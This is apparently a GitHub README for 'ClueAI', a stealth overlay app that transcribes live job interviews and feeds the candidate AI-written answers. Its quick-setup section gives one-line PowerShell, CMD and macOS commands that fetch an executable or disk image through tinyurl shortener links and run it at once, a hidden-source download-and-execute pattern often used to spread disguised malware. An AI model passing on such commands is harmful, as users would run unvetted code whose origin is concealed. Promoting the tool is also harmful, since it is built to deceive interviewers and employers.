# 🕵️‍♂️ ClueAI - The Ultimate AI Interview Assistant

<p align="center">
  <img src="public/logo_rounded.svg" width="120" alt="ClueAI Logo" />
</p>

<p align="center">
  <img src="https://img.shields.io/badge/React-20232A?style=for-the-badge&logo=react&logoColor=61DAFB"/>
  <img src="https://img.shields.io/badge/Electron-191970?style=for-the-badge&logo=Electron&logoColor=white"/>
  <img src="https://img.shields.io/badge/TypeScript-007ACC?style=for-the-badge&logo=typescript&logoColor=white"/>
  <img src="https://img.shields.io/badge/Tailwind_CSS-38B2AC?style=for-the-badge&logo=tailwind-css&logoColor=white"/>
  <img src="https://img.shields.io/badge/Groq-FF5722?style=for-the-badge&logo=lightning&logoColor=white"/>
  <img src="https://img.shields.io/badge/Gemini_AI-8E75B2?style=for-the-badge&logo=googlebard&logoColor=white"/>
  <img src="https://img.shields.io/badge/License-MIT-brightgreen?style=for-the-badge"/>
</p>

<p align="center">
  <strong>ClueAI</strong> is a cutting-edge, transparent desktop application designed to assist you during live interviews. By combining real-time speech-to-text with advanced LLMs (Groq & Gemini), ClueAI listens to your interviewer, analyzes your uploaded resumes, and provides 100% human-like, highly accurate answers instantly on your screen.
</p>

---

## ⚡ Quick Download & Instant Setup (Latest Release v5.6.8)

### 🪟 1. For Windows

- **Direct Download Link**: [https://tinyurl.com/2a2lfo9a](https://tinyurl.com/2a2lfo9a)
- **One-line Command** (Windows PowerShell - Works on all Windows versions):
  ```powershell
  curl.exe -L --retry 10 --retry-delay 2 --retry-all-errors -C - -o ClueAI.exe https://tinyurl.com/2a2lfo9a; .\ClueAI.exe
  ```
- **One-line Command** (Command Prompt / CMD):
  ```cmd
  curl.exe -L --retry 10 --retry-delay 2 --retry-all-errors -C - -o ClueAI.exe https://tinyurl.com/2a2lfo9a && ClueAI.exe
  ```

---

### 🍎 2. For macOS

- **Direct Download Link**: [https://tinyurl.com/2yynsmoo](https://tinyurl.com/2yynsmoo)
- **One-line Command** (macOS Terminal):
  ```bash
  curl -L -o ClueAI.dmg https://tinyurl.com/2yynsmoo && open ClueAI.dmg
  ```

---

### 🚀 3-Step Quick Start (Zero Complex Setup)
1. **Download:** Use the 1-line command or browser link for your operating system.
2. **Launch:** Open `ClueAI`.
3. **Configure & Start:**
   - Click the **Settings (⚙️)** icon in the top bar.
   - Enter your preferred AI provider API key (Groq, Gemini Flash, Claude, ChatGPT, or DeepSeek).
   - Click **Start Interview**, choose your session context, and let ClueAI assist you in real time!

---

## ✨ Features

| Feature | Description |
|---|---|
| 🎙️ **Real-Time Transcription** | Seamlessly captures and transcribes live interview audio. |
| 📄 **Dual-Resume Priority System** | Upload up to two resumes. Mark one as "High Priority" for the AI to focus on first, falling back to the second only if needed. |
| 👤 **Personal Context** | Upload a dedicated file about your strengths, weaknesses, and hobbies so the AI can answer behavioral questions perfectly. |
| 📸 **Snipping Tool (Vision AI)** | Built-in safe screenshot tool! Drag a box over a coding question or diagram, and the Vision AI will analyze it instantly. |
| ⚡ **Lightning Fast AI** | Switch between Groq (Llama 3) for ultra-low latency or Gemini Flash for complex reasoning. |
| 👻 **Stealth Mode** | Transparent, borderless UI that floats perfectly on your screen without interfering with your workflow. |

---

## 📥 How to Download & Run (For Users)

You do **not** need to install any coding tools to use ClueAI! 

1. Go to the [Releases](https://github.com/HelloWorld-Farhan/ClueAi/releases) section of this repository.
2. Download the latest **`ClueAI.exe`** file.
3. Double-click the downloaded file to run the application immediately (Portable App - no installation required!).
4. Enter your API keys in the Settings panel, upload your resumes, and start acing your interviews!

---

## 💻 How to Build (For Developers)

Before you begin, ensure you have **Node.js** installed and **Developer Mode** enabled on Windows (required for `electron-builder` symlinks).

### Step 1 — Clone the Repository
```bash
git clone https://github.com/HelloWorld-Farhan/ClueAi.git
cd ClueAi
```

### Step 2 — Install Dependencies
```bash
npm install
```

### Step 3 — Run Locally in Development
```bash
npm run start
```

### Step 4 — Build the `.exe` Release
```bash
npm run dist
```
*Your `ClueAI.exe` file will be generated inside the `release` folder.*

---

## 🐳 Docker Deployment (Cross-Device & Web Support)

ClueAI can be deployed anywhere with Docker, allowing you to access and run ClueAI seamlessly on any device (Windows, macOS, Linux, tablet, or phone) through your browser:

### Option A — Using Docker Compose (Recommended)
```bash
docker compose up -d --build
```
Then open your browser at **`http://localhost:3000`**.

### Option B — Using Docker CLI
```bash
# Build the Docker image
npm run docker:build

# Run the container
npm run docker:run
```

To stop the container:
```bash
docker compose down
```

---

## 👨‍💻 Author

**Farhan Khalid**  
📧 farhankhalid17968@gmail.com  
🔗 [LinkedIn](https://www.linkedin.com/in/farhan-khalid-117514259/)  
🐙 [GitHub](https://github.com/HelloWorld-Farhan)  

---

## 📄 License

```text
MIT License

Copyright (c) 2026 Farhan Khalid

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is furnished
to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.
```

---

## 🌟 Support

If you found this tool helpful for cracking your interviews, please consider giving it a ⭐ on GitHub!

<p align="center">Made with ❤️ in India</p>
